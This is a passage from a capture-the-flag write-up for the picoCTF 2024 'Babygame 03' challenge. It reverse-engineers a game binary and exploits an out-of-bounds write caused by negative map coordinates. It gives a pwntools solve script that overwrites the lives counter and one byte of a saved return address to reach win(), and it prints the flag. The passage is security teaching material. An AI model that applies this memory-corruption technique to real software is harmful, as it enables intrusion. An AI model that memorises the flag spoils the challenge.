![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cb576611-80fb-4999-8d7f-6bec4eaea9d0)

Now we just need to fill in the data type correctly and give it a name and that's all
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c764b1ec-7637-4bda-bc14-80fbe6e7b800)

With this done let us change the data type in the `init_player()` function to the `player` struct

To do that click `CTRL+L` and change it to `player *`

Doing that we should get this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8c7cff56-c830-4d27-bec0-c6f3f1437095)

Ok that's now more readable and clear at this point we can just rename the variable and continue with reversing
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5c018b98-a05f-42dc-807a-2430c87976fc)

```c
void init_player(player *player)

{
  player->y = 4;
  player->x = 4;
  player->lives = 0x32;
  return;
}
```

Back to the main function the next function that's called is `init_map()`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/35c621c7-ea76-4e4d-8745-a90c7e5a4999)

After some renaming and correct data type changing i got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/939742f3-c499-45fe-97f5-3b443c0b9ea7)

```c
void init_map(char *map,player *player,int *level)

{
  int random;
  int i;
  int j;
  
  j = 0;
  do {
    if (0x1d < j) {
      return;
    }
    for (i = 0; i < 0x5a; i = i + 1) {
      if ((j == 0x1d) && (i == 0x59)) {
        map[0xa8b] = 'X';
      }
      else if ((j == player->y) && (i == player->x)) {
        map[i + j * 0x5a] = player_tile;
      }
      else {
        random = rand();
        if (j == random % *level) {
          random = rand();
          if (i == random % *level) {
            map[i + j * 0x5a] = '#';
            goto inc;
          }
        }
        map[i + j * 0x5a] = '.';
      }
inc:
    }
    j = j + 1;
  } while( true );
}
```

This function does exactly what it says....it initializes the map

Ok one thing to note is that the map is an array that can hold up 2700 bytes

```c
char map [2700];
```

Next function does exactly what it says
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c02a3b56-fcae-48db-912f-8ecde34bcac7)

```c
void print_map(char *map,player *player,int level)

{
  int j;
  int i;
  
  clear_screen();
  find_player_pos(map,level);
  find_end_tile_pos(map);
  print_lives_left(player);
  for (i = 0; i < 0x1e; i = i + 1) {
    for (j = 0; j < 0x5a; j = j + 1) {
      putchar((int)map[j + i * 0x5a]);
    }
    putchar(10);
  }
  fflush(_stdout);
  return;
}
```

Now this the the part that deals with how the game works based on our input
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46988337-cb5f-48cf-bcf5-35a17dda8bd8)

```c
undefined4 main(void)

{
  int inp;
  int level;
  player player;
  char map [2700];
  char value;
  int i;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&player);
  level = 1;
  i = 0;
  init_map(map,&player,&level);
  print_map(map,&player,(int)&level);
  signal(2,sigint_handler);
  do {
    inp = getchar();
    position = (char)inp;
    move_player(&player,(int)position,map,&level);
    print_map(map,&player,(int)&level);
    if (((player.y == 0x1d) && (player.x == 0x59)) && (level != 4)) {
      puts("You win!\n Next level starting ");
      i = i + 1;
      level = level + 1;
      init_player(&player);
      init_map(map,&player,&level);
    }
  } while (((player.y != 0x1d) || (player.x != 0x59)) || ((level != 5 || (i != 4))));
  win(&level);
  return 0;
}
```

Here's what it does:
- Initializes the `level` and `i` to `1` and `0` respectively.
- While the player's `y` and `x` coordinates are not equal to `29` and `89` with the `level` and `i` not being equal `5` and `4` respectively it goes into the while loop doing this:
  - Receives our input which is used as the position passed into the `move_player` function
  - Prints the current map.
  - It then checks if the player's `y` and `x` coordinates are equal to `29` and `89` with the `level` being equal to 4. If that's the case it will increment `i` and `level` by 1 and initialize the map and player's structure again.
- Else if we don't meet that condition it would call the win function passing our current level as the parameter.

At this point we can kind of tell what's the "goal"

We need to move the player to the end of the map (29, 89) and the level and i must be 5 and 4

But if you look well you would see that the level was initialized as 1 while i as 0

And there's a weird condition in the part that deals with how we can increment our level and i

It would only increment when we are at the end of the map and the level is not equal to 4

Do you see it?

If the level is not equal to 4 means we can only get to pass that comparism 3 times

Meaning we can only get to set level and i to 4 and 3 

And the condition set for the loop to exit and call the win() function is when the player's position is at the end of the map (29, 89), the level is 5, and i is 4

Ok that looks impossible to achieve "for now :)"

Back to reversing.....If we are able to break out of the loop it would call the win function passing the level as the parameter

Looking at the pseudocode shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d9422c83-3a53-4987-b67f-98d636242b10)

This would open up the flag file and print it's content to stdout only when the level is 5

OK at this point we know that the level must surely equal 5 to get the flag

Now let us take a look at the function that moves the player around the map
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6f4d4677-d2fb-4fdb-be6f-efcb56a45215)

```c
void move_player(player *player,char position,char *map,int level)

{
  int value;
  
  if (player->lives < 1) {
    puts("No more lives left. Game over!");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (position == 'l') {
    value = getchar();
    player_tile = (char)value;
  }
  if (position == 'p') {
    solve_round(map,player,level);
  }
  map[player->x + player->y * 0x5a] = '.';
  if (position == 'w') {
    player->y = player->y + -1;
  }
  else if (position == 's') {
    player->y = player->y + 1;
  }
  else if (position == 'a') {
    player->x = player->x + -1;
  }
  else if (position == 'd') {
    player->x = player->x + 1;
  }
  if (map[player->x + player->y * 0x5a] == '#') {
    puts("You hit an obstacle!");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  map[player->x + player->y * 0x5a] = player_tile;
  player->lives = player->lives + -1;
  return;
}
```

First thing it does is to make sure the player's live isn't less than 1

Then it does this:

```c
map[player->x + player->y * 0x5a] = '.';
```

Basically what that does is to set the previous location of the player's position to `.`

Based on the position we choose it will update the coordinates (y, x)

```
w --> move up
s --> move down
a --> move left
d --> move right
```

But there are two position that were not known to us and they are `l & p`

We can use `l` to change the value of the player character

```c
  if (position == 'l') {
    value = getchar();
    player_tile = (char)value;
  }
```

While `p` is used to automatially solve the map

```c
  if (position == 'p') {
    solve_round(map,player,level);
  }
```

And it achieves that by moving the player on the map based on certain conditions
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2279b007-9f5b-46eb-ac13-3eaf3c8debd4)

Ok back to the `move_player()` function the last part is this

```c
if (map[player->x + player->y * 0x5a] == '#') {
puts("You hit an obstacle!");
fflush(_stdout);
                /* WARNING: Subroutine does not return */
exit(0);
}
map[player->x + player->y * 0x5a] = player_tile;
player->lives = player->lives + -1;
return;
}
```

Basically this checks if we are at (0, 1) and if we are there then we hit the obstable and the program exits, we can try this out
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df693f96-88a0-402b-9cd7-9e805fc802f7)

But if that's not the case it updates the current value of the player on the map to the `player_tile` character and decrements the player's live by 1

And returns........

Ok that's all the important function i wanted to show 

Now that we are harmed with this information what exactly is the bug?

You can try to find it but if you can't do that here's the bug:

```c
map[player->x + player->y * 0x5a] = player_tile;
```

While updating our player's character, it does that based on the position of the character on the map

It calculates the position using the player's `x and y` value

But there's nothing stopping us from using a negative value of x or y 

Here's an example, if x is at -1 and y is at 0

The position would then be:

```
map[-1 + (0 * 90)]
map[-1 + 0]
map[-1]
```

With that we have out of bound write

Out of bound meaning we can make arbitrary writes out of the map array bound?

But looking back at the pseudocode well we can find a problem which is this

```
map[player->x + player->y * 0x5a] = '.';
```

It would set the previous value of the map character to `.`

So let's say we are at `map[0]` and we move to `map[-1]` the value stored in `map[0]` would be set to `.` same as when we move from `map[-1]` to `map[-2]` the value stored there at `map[-1]` would be set to `.`

What that is doing is going to prevent us from making arbitrary write to memory but that doesn't stop us because we still control one byte

Therefore if we are to overwrite any value on the stack it would just one byte we would be overwritting

Now even if we could overwrite an address with just a byte what do we want to do with that?

Remember from the main function that weird condition which prevents us from making level to 5 and i to 4, how do we also go about that?

Inorder to deal with all this issue we first need to be able to move around the map freely because we have very limited lives

So my first goal would be to overwrite the `players->lives` value to a large number

Firstly let's disable ASLR so that the addresses would be the same as it makes calculating offsets easier

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Ok now how did I calculate the offset of `map -> lives`

Looking at the main function before it called `print_map` the parameter passed into the function are `map, players's structure, level`

So I set a breakpoint at the call to `print_map` and after starting the process I hit the breakpoint and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46d90448-edc9-4cc5-946b-e30b80651af3)

```
 ► 0x80498e9 <main+120>    call   print_map                     <print_map>
        arg[0]: 0xffffc3ef ◂— 0x2e2e2e23 ('#...')
        arg[1]: 0xffffc3e0 ◂— 0x4
        arg[2]: 0xffffc3dc ◂— 0x1
```

Ok from this we know that:

```
map == 0xffffc3ef
player-> lives = 0xffffc3e0+8
level == 0xffffc3dc
```

So now i calculated the offset of the map to the player->lives structure to be:

```
= player->lives - map
= 0xffffc3e8-0xffffc3ef
= -7
```

That means if we go to `map[-7]` it would be the address of `player->lives`

In order to achieve this we need to set `x` to `-6` and `y` to `0`

```
map[x + (y * 90)]
map[-6 + 0]
map[-6]
```

Also remember that the initial position of (x, y) are (4, 4)

So that means to reach `-6` we need to move `x` to `a*10` and `y` to `w*4`

You may notice I used -6 instead of -7 the reason is because of this

Let's say the address of `player->lives` is `0xffffc3e8` 

And it contains this:

```
0xffffc3e8: 0x00000031
```

If we overwrite `-7` that's going to be the lsb of that address meaning it would just eventually overwrite `0x31` to our current player character then if we move again around the map it would replace `0x31` with `0x2e --> '.'`

That would rather decrease the live so rather than overwriting the lsb i overwrote it to be:

```
0xffffc3e8: 0x00002e31
```

Ok now with that said I did just that

Here's the wrapper function I made use of

```python
class Player:
    def __init__(self, y, x):
        self.x = x
        self.y = y

    def get_position(self):
        return (self.x, self.y)
    
    def get_relative_index(self):
        return self.x + (self.y * 0x5a)
    
    def move(self, direction):
        match direction:
            case 'a':
                self.x -= 1
            case 'd':
                self.x += 1
            case 'w':
                self.y -= 1
            case 's':
                self.y += 1
        
        log.info(f'Player position (x, y): {self.get_position()} | map[{self.get_relative_index()}]')

def read_map():
    return io.recv(0x6c7)


def send_movement(player, direction, read=True):
    io.send(direction)
    str_direction = direction.decode('utf-8')
    log.info(f'Sending {str_direction}')
    for c in str_direction:
        player.move(c)
        if read: read_map()

def change_tile_character(lower_byte):
    io.send(b'l' + lower_byte)
    log.info(f'Changing tile to: {lower_byte.decode("utf-8")}')
    # read_map()

def solve():
    player = Player(4, 4)

    def get_lives():
        """
        Get large amount of lives
        """
        send_movement(player, b'a'*10)
        send_movement(player, b'w'*4)

        # {-7, 0}

    def reset():
        """
        Reset the co-ordinates to (4, 4)
        """
        send_movement(player, b's'*4)
        send_movement(player, b'd'*10)

    get_lives()
```

Btw we are just basically taking advantage of the fact that it will update the previous location of the map to the current player tile character to get larger lives

Now after that we can get large lives

With that we can move around the map freely what next?

Back to the main function we know that we need a way to increment the level and i but as of now that is impossible because of the logic that handles it

Ok i won't say totally impossible because we are going to bypass this 

One thing we should know is that when a function is called it creates a stack frame, and then when it's about to return the next instruction of the function which it was called from would be placed in the instruction pointer which then makes the program returns from the current function

Let's take this as example:

```
Dump of assembler code for function main:
   0x08049927 <+182>:   call   0x8049533 <move_player>
   0x0804992c <+187>:   add    esp,0x10


Dump of assembler code for function move_player:
   0x08049533 <+0>:     push   ebp
   0x08049534 <+1>:     mov    ebp,esp
   0x08049536 <+3>:     push   esi
   0x08049537 <+4>:     push   ebx
   0x08049538 <+5>:     sub    esp,0x10
   ........... instructions ----------
   0x0804969c <+361>:   pop    ebx
   0x0804969d <+362>:   pop    esi
   0x0804969e <+363>:   pop    ebp
   0x0804969f <+364>:   ret
```

From the main function, when it calls `move_player` it would store the next instruction which is `add esp, 0x10` to the stack

Then function `move_player` would create a new stack frame and after it does whatever it wants to do, it would then set `esp` to the next instruction which is in main i.e `add esp, 0x10`

Ok let's just test this out for you to see

In gdb i'll set a breakpoint at this following places:

```
- main+182
- move_player+361
```

Starting the process and using `w` hits the first breakpoint
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8cde45da-789c-4b36-996f-9879bf294362)

We can see that the stack is still it's normal value but once we step into this function we get this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d470f667-2844-42fb-8b8b-a569b7fc834c)

Cool we see that the stack address `0xffffc3ac` is pointing to the next instruction in main

At this point `move-player` would create a new stack frame, on continuing the process we should hit the last breakpoint
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bc918b73-2fa7-4252-8ec9-5f3e546285ba)

Currently the stack frame instruction pointer is not yet placed into esp, but we can tell that after it does the three pop instruction the next value which is at the top of the stack would be the instruction which was placed on the stack `add esp, 0x10`

So we use `ni` thrice we get this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/052f1a0d-0942-470e-ba94-5f79ea8782cd)

We can see that when it's about to return it would return to the address currently placed on the stack

With that said how exactly do we take advantage of this?

While we are in function `move_player` we can overwrite the lsb of the stack frame eip address

Meaning we can control the flow of the program execution with just "a byte"

Even though it's a byte we can't just freely move anywhere in memory but rather we can move any where in `main`

Ok with that said where would we want to jump to in main?

Because of this condition we can't set our level to 5 and i to 1
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f1dcb153-721a-43ee-a6d8-26ba39a96a1d)

So instead of the move_player returning to main and continuing the control flow we can rather return here
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9f5998a7-7ca1-453e-b6a8-583e05673812)

This means that instead of `move_player` to return to `0x804992c` we can overwrite the lsb of the stack frame eip therefore making it return to `0x804997a`

Now that would bypass the comparism and if we do that 4 times our live would be set to 5 and i set to 4

Ok we have an exploit plan how do we go about it?

First we need to get the offset of `map --> stack_frame (eip)`

To get the stack frame eip we can just gdb `info frame` command to view the stack frame
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cdfd3b36-18cf-4801-93ca-d7892ec0e043)

We can just easily subtract it

```
map = 0xffffc3ef
eip = 0xffffc3bc
offset = eip - map
= 0xffffc3bc - 0xffffc3ef
= -51

map[-51] == eip (stack frame)
```

To get to this offset we need to set `x` to `-55` and `y` to `0` 

It's `(0, -55)` because i will return to my initial coordinate back (4, 4) before attempting to move to `map[-51]`

Ok but what do we overwrite it with?

Remember that we have a function that can allow us change the player tile character and that's accessed using `l`

In this case I'll change the character to `0x7a` and then when it overwrites the lsb it should point to `main+265 == 0x0804997a`

You might wonder, won't the lsb get overwritten with a `.` ?

Well normally that would be the case once we move around the map after overwritting the lsb but this time around after we overwrite the stack frame instruction pointer we won't move around the map but rather let the program continue it's execution and therefore it would basically reset the map and the players structure
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d15bb107-f0b1-42e6-8b98-9fb7996bbeba)

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b99814a8-83bc-41b9-9ced-0dbc81df15df)

```python
for _ in range(5):
    get_lives()
    reset()
    change_tile_character(p8(0x7a))
    send_movement(player, b'a'*55)
    send_movement(player, b'w'*4)
```

Ok now we have everything needed but when we then choose `p` which solves the map we don't break out of the loop?
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7b658d8d-bbbf-4e8a-9b3b-49859600f762)

We can see that it rather increments our live value to 7?

How do we avoid this and instead get the flag?

Well to do this rather than us jumping to `0x0804997a` we can jump to few instructions before it calls `win()`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/935f8685-7381-4ddf-9bec-f5990987517c)

In my case I choose to jump here `0x80499e5`

Here's how to do it:
- Increment the level by 5 and i should be set to 4
- On the 4th oob write we set the stack frame instruction pointer to `0xe5`
- When we then trigger the write it calls win()
- Profit since level is set to 5 (flag gotten!)

Here's it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad977937-1fb1-4a3d-be26-ddb8e2b8c0f8)

```python
    for _ in range(4):
        get_lives()
        reset()
        change_tile_character(p8(0x7a))
        send_movement(player, b'a'*55)
        send_movement(player, b'w'*4)

    get_lives()
    reset()
    io.send(b'l'+p8(0xe5))
    send_movement(player, b'a'*55)
    send_movement(player, b'w'*4)
```

But trying that remotely doesn't work when i initially solved it

Though it seems to work now
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2457d19e-592b-42a2-9809-25b61dc2886a)

During the ctf it didn't work so instead i fuzzed for the right offset to overwrite and that got me the flag too

Also i didn't mention this but here's the python implementation of how the level increases:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1b503d39-d664-4357-be43-5fdea7264d78)

I actually got stucked here because though the level was at 5 it showed 4 that's why when i tried to write in 5 loops and used 'p' it incremented to 7 because it was 6 😄

With that said, here's my full solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Babygame%2003/solve.py)

```
Flag: picoCTF{gamer_leveluP_fb9b377c}
```

That's all the challenges I was able to solve
